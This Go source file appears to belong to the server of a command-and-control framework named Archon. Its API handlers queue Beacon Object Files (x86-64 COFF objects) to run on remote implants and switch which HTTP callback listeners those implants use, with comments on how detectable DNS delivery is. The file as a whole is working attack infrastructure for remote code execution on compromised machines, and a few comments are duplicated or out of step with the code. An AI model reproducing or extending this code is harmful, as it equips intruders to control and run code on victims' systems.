// Package main: beacon-scoped operations that need the beacon dashboard.
//
// Two capabilities live here:
//
//   - Running a BOF on a beacon. The object travels inside the task, so the
//     transport carries it like any other command; only HTTP/dual beacons are
//     eligible, because a DNS task is chunked into 400-byte labels.
//   - Reading and replacing which HTTP listeners a beacon uses, mirroring how
//     DNS domains are toggled per beacon.
package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sort"
	"strings"

	"github.com/gorilla/mux"
)

const (
	// maxBOFObjectBytes mirrors the beacon's own limit. It is also what keeps the
	// encoded task inside the beacon's max_body_bytes (1 MiB by default).
	maxBOFObjectBytes = 512 * 1024

	coffMachineAMD64 = 0x8664
)

// beaconTransportFor returns the transport a beacon was built for, from the build
// config Archon stored at build time. Empty means "not recorded" - builds made
// before transport was stored, or a beacon whose build row is gone.
//
// This is advisory: the beacon is the authority, because the operator can move a
// live beacon between transports with update_transport. The BOF endpoint uses it
// to refuse an obviously-wrong request early and to tell the operator why.
func (api *APIServer) beaconTransportFor(beacon Beacon) string {
	if beacon.BuildID == "" {
		return ""
	}
	config, err := api.db.GetBuildConfigByBuildID(beacon.BuildID)
	if err != nil || config.BinaryID == "" {
		return ""
	}
	if transport, ok := config.Extra["transport"].(string); ok {
		return normalizeTransportMode(transport)
	}
	return ""
}

// beaconTransport returns the transport a beacon is using: the per-beacon record
// if the dashboard has set one, otherwise what it was built with.
func (api *APIServer) beaconTransport(beacon Beacon) string {
	if _, transport, ok := api.db.GetBeaconHTTPListeners(beacon.ID); ok && transport != "" {
		return normalizeTransportMode(transport)
	}
	return api.beaconTransportFor(beacon)
}

// normalizeTransportMode mirrors the client's mapping, so an empty or unknown
// value reads as DNS rather than as "no restriction".
func normalizeTransportMode(mode string) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "http":
		return "http"
	case "dual":
		return "dual"
	default:
		return "dns"
	}
}

// handleRunBOF queues a BOF task for one beacon.
func (api *APIServer) handleRunBOF(w http.ResponseWriter, r *http.Request) {
	beaconID := mux.Vars(r)["id"]
	if beaconID == "" {
		api.sendError(w, http.StatusBadRequest, "beacon id is required")
		return
	}

	var req struct {
		Name string `json:"name"`
		Args string `json:"args"`
		Data string `json:"data"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	beacon, err := api.db.GetBeacon(beaconID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to load beacon")
		return
	}
	if beacon.ID == "" {
		api.sendError(w, http.StatusNotFound, fmt.Sprintf("no beacon with id %q", beaconID))
		return
	}

	// Only HTTP-carrying beacons may receive an object file. A DNS-only beacon
	// would have to pull it through subdomain labels, which is both slow and
	// extremely loud.
	if transport := api.beaconTransport(beacon); transport != "" && transport == "dns" {
		api.sendError(w, http.StatusConflict,
			"this beacon was built for DNS only; move it to an HTTP listener before running a BOF")
		return
	}

	object, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		api.sendError(w, http.StatusBadRequest, "object is not valid base64")
		return
	}
	if len(object) == 0 {
		api.sendError(w, http.StatusBadRequest, "no object file supplied")
		return
	}
	if len(object) > maxBOFObjectBytes {
		api.sendError(w, http.StatusRequestEntityTooLarge,
			fmt.Sprintf("object is %d bytes, over the %d byte limit", len(object), maxBOFObjectBytes))
		return
	}
	if len(object) < 20 {
		api.sendError(w, http.StatusBadRequest, "object is too short to be a COFF file")
		return
	}
	if machine := binary.LittleEndian.Uint16(object[0:2]); machine != coffMachineAMD64 {
		api.sendError(w, http.StatusBadRequest,
			fmt.Sprintf("object machine 0x%04x is not an x86-64 COFF object", machine))
		return
	}

	name := strings.TrimSpace(req.Name)
	if name == "" {
		name = "unnamed.bof"
	}

	document, err := json.Marshal(map[string]string{
		"name": name,
		"args": req.Args,
		"data": base64.StdEncoding.EncodeToString(object),
	})
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to encode task")
		return
	}

	taskID, err := api.db.CreateTask(beaconID, bofCommandPrefix+string(document), r.Header.Get("X-Operator-ID"))
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to queue BOF task: "+err.Error())
		return
	}

	api.db.LogAuditEvent(r.Header.Get("X-Operator-ID"), "bof_task", "beacon", beaconID,
		fmt.Sprintf("Queued BOF %s (%d bytes)", name, len(object)), r.RemoteAddr)

	api.sendSuccess(w, "BOF task queued", map[string]interface{}{
		"task_id": taskID,
		"beacon":  beaconID,
		"name":    name,
		"bytes":   len(object),
	})
}

// bofCommandPrefix is the task marker the beacon dispatches on.
const bofCommandPrefix = "bof:"

// httpListenerNames lists the profile names a build embedded, for the dashboard.
func httpListenerNames(listeners []HTTPListenerSpec) []string {
	names := make([]string, 0, len(listeners))
	for _, listener := range listeners {
		if listener.Name != "" {
			names = append(names, listener.Name)
		}
	}
	return names
}

// handleListBeaconHTTPListeners returns the stored profiles with the ones this
// beacon is known to use marked active.
func (api *APIServer) handleListBeaconHTTPListeners(w http.ResponseWriter, r *http.Request) {
	beaconID := mux.Vars(r)["id"]
	beacon, err := api.db.GetBeacon(beaconID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to load beacon")
		return
	}
	if beacon.ID == "" {
		api.sendError(w, http.StatusNotFound, fmt.Sprintf("no beacon with id %q", beaconID))
		return
	}

	active, recordedTransport, recorded := api.beaconHTTPListenerNames(beacon)
	transport := recordedTransport
	if !recorded {
		active, _ = api.beaconHTTPListenerNamesFromBuild(beacon)
		transport = api.beaconTransportFor(beacon)
	}
	records, err := api.db.ListHTTPProfiles()
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to list HTTP profiles")
		return
	}

	activeSet := make(map[string]bool, len(active))
	for _, name := range active {
		activeSet[name] = true
	}

	listeners := make([]map[string]interface{}, 0, len(records))
	for _, record := range records {
		var document struct {
			Scheme     string `json:"scheme"`
			BeaconHost string `json:"beacon_host"`
			Enabled    *bool  `json:"enabled"`
		}
		_ = json.Unmarshal([]byte(record.Document), &document)
		enabled := true
		if document.Enabled != nil {
			enabled = *document.Enabled
		}
		listeners = append(listeners, map[string]interface{}{
			"name":        record.Name,
			"scheme":      document.Scheme,
			"beacon_host": document.BeaconHost,
			"enabled":     enabled,
			"active":      activeSet[record.Name],
		})
	}
	sort.Slice(listeners, func(i, j int) bool {
		return listeners[i]["name"].(string) < listeners[j]["name"].(string)
	})

	api.sendSuccess(w, "beacon http listeners", map[string]interface{}{
		"listeners": listeners,
		"transport": transport,
		"active":    active,
	})
}

// handleSetBeaconHTTPListeners applies a listener selection to one beacon by
// queueing an update_transport task, the same channel the transport controls use.
func (api *APIServer) handleSetBeaconHTTPListeners(w http.ResponseWriter, r *http.Request) {
	beaconID := mux.Vars(r)["id"]
	var req struct {
		Names []string `json:"names"`
		Mode  string   `json:"mode"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	beacon, err := api.db.GetBeacon(beaconID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to load beacon")
		return
	}
	if beacon.ID == "" {
		api.sendError(w, http.StatusNotFound, fmt.Sprintf("no beacon with id %q", beaconID))
		return
	}

	mode := normalizeTransportMode(req.Mode)
	if mode == "dns" && len(req.Names) > 0 {
		api.sendError(w, http.StatusBadRequest, "DNS mode does not use HTTP listeners")
		return
	}

	listeners, err := api.httpListenerSpecs(req.Names)
	if err != nil {
		api.sendError(w, http.StatusBadRequest, err.Error())
		return
	}

	payload, err := buildTransportUpdatePayload(mode, listeners, 3, 60)
	if err != nil {
		api.sendError(w, http.StatusBadRequest, err.Error())
		return
	}

	// Hand the beacon a URL and a single-use token, not the profile itself. On DNS
	// the full document is hundreds of label-sized chunks; the short form is one
	// or two, and the profile arrives over the HTTP listener it describes.
	delivered := ""
	if mode != "dns" && len(listeners) > 0 {
		bootstrapURL := api.bootstrapURLForListener(listeners[0])
		if bootstrapURL == "" {
			api.sendError(w, http.StatusBadRequest, "the selected profile has no reachable bootstrap endpoint")
			return
		}
		token, err := api.db.IssueHTTPProfileToken(beaconID, listeners[0].Name, "", payload)
		if err != nil {
			api.sendError(w, http.StatusInternalServerError, err.Error())
			return
		}
		short := buildHTTPProfileTask(bootstrapURL, token, listeners[0].SPKISHA256)
		if _, err := api.db.CreateTask(beaconID, short, ""); err != nil {
			api.sendError(w, http.StatusInternalServerError, err.Error())
			return
		}
		delivered = short
	} else {
		// DNS mode carries no listener: the full payload is short by definition.
		if err := api.queueTransportUpdate(beaconID, payload); err != nil {
			api.sendError(w, http.StatusInternalServerError, err.Error())
			return
		}
		delivered = payload
	}
	// Record it before replying: the dashboard reads this back to show which
	// listeners are active, and the BOF card uses it to decide eligibility.
	if err := api.db.SetBeaconHTTPListeners(beaconID, req.Names, mode); err != nil {
		log.Printf("[BEACON] failed to record listener selection for %s: %v", beaconID, err)
	}

	api.db.LogAuditEvent(r.Header.Get("X-Operator-ID"), "beacon_http_listeners", "beacon", beaconID,
		fmt.Sprintf("Set transport %s with listeners %s", mode, strings.Join(req.Names, ",")), r.RemoteAddr)

	api.sendSuccess(w, "transport update queued", map[string]interface{}{
		"beacon":    beaconID,
		"mode":      mode,
		"listeners": req.Names,
		"payload":   delivered,
		"delivery":  map[string]string{"mode": mode, "transport": "bootstrap"},
	})
}

// httpListenerSpecs projects stored profiles onto the beacon-side listener shape.
// The projection lives here rather than in the browser so a build, a transport
// push and this endpoint cannot disagree about which fields travel.
func (api *APIServer) httpListenerSpecs(names []string) ([]HTTPListenerSpec, error) {
	if len(names) == 0 {
		return nil, nil
	}
	specs := make([]HTTPListenerSpec, 0, len(names))
	for _, name := range names {
		record, err := api.db.GetHTTPProfile(name)
		if err != nil || record == nil {
			return nil, fmt.Errorf("no stored profile named %q", name)
		}
		spec, err := httpListenerSpecFromDocument(record.Document)
		if err != nil {
			return nil, fmt.Errorf("profile %q: %w", name, err)
		}
		spec.Name = name
		specs = append(specs, spec)
	}
	return specs, nil
}

// httpListenerSpecFromDocument maps a stored profile document onto the fields a
// beacon embeds. Listener-only fields (bind address, certificate paths) stay
// behind: the beacon never uses them.
func httpListenerSpecFromDocument(document string) (HTTPListenerSpec, error) {
	var parsed struct {
		Name       string `json:"name"`
		Scheme     string `json:"scheme"`
		BeaconHost string `json:"beacon_host"`
		HostHeader string `json:"host_header"`
		TLS        struct {
			SPKISHA256 string `json:"spki_sha256"`
		} `json:"tls"`
		URIs           map[string][]string    `json:"uris"`
		Methods        map[string]string      `json:"methods"`
		UserAgents     []string               `json:"user_agents"`
		Headers        []HTTPHeaderSpec       `json:"headers"`
		RequestHeaders []HTTPHeaderSpec       `json:"request_headers"`
		RequestBody    map[string]interface{} `json:"request_body"`
		ResponseBody   map[string]interface{} `json:"response_body"`
		Auth           map[string]interface{} `json:"auth"`
		TimeoutSecs    int                    `json:"timeout_secs"`
		MaxBodyBytes   int64                  `json:"max_body_bytes"`
	}
	if err := json.Unmarshal([]byte(document), &parsed); err != nil {
		return HTTPListenerSpec{}, fmt.Errorf("document is not JSON: %w", err)
	}

	return HTTPListenerSpec{
		Name:           parsed.Name,
		Scheme:         parsed.Scheme,
		Host:           parsed.BeaconHost,
		HostHeader:     parsed.HostHeader,
		SPKISHA256:     parsed.TLS.SPKISHA256,
		URIs:           parsed.URIs,
		Methods:        parsed.Methods,
		UserAgents:     parsed.UserAgents,
		Headers:        parsed.Headers,
		RequestHeaders: parsed.RequestHeaders,
		RequestBody:    parsed.RequestBody,
		ResponseBody:   parsed.ResponseBody,
		Auth:           parsed.Auth,
		TimeoutSecs:    parsed.TimeoutSecs,
		MaxBodyBytes:   parsed.MaxBodyBytes,
		BootstrapPath:  bootstrapPathFromURIs(parsed.URIs),
	}, nil
}

// beaconHTTPListenerNames returns the listeners Archon last told this beacon to
// use, from the per-beacon record the dashboard writes.
// use, if that was recorded at build time.
func (api *APIServer) beaconHTTPListenerNames(beacon Beacon) ([]string, string, bool) {
	return api.db.GetBeaconHTTPListeners(beacon.ID)
}

// beaconHTTPListenerNamesFromBuild falls back to what the beacon was built with,
// for beacons that predate the per-beacon record.
func (api *APIServer) beaconHTTPListenerNamesFromBuild(beacon Beacon) ([]string, bool) {
	if beacon.BuildID == "" {
		return nil, false
	}
	config, err := api.db.GetBuildConfigByBuildID(beacon.BuildID)
	if err != nil || config.BinaryID == "" {
		return nil, false
	}
	raw, ok := config.Extra["http_listener_names"].([]interface{})
	if !ok {
		return nil, false
	}
	names := make([]string, 0, len(raw))
	for _, entry := range raw {
		if name, ok := entry.(string); ok && name != "" {
			names = append(names, name)
		}
	}
	return names, true
}

// bootstrapPathFromURIs reads the profile's hand-off path. uris.bootstrap is the
// documented place; a profile that does not set it gets the default.
func bootstrapPathFromURIs(uris map[string][]string) string {
	for _, path := range uris["bootstrap"] {
		if strings.TrimSpace(path) != "" {
			return path
		}
	}
	return ""
}
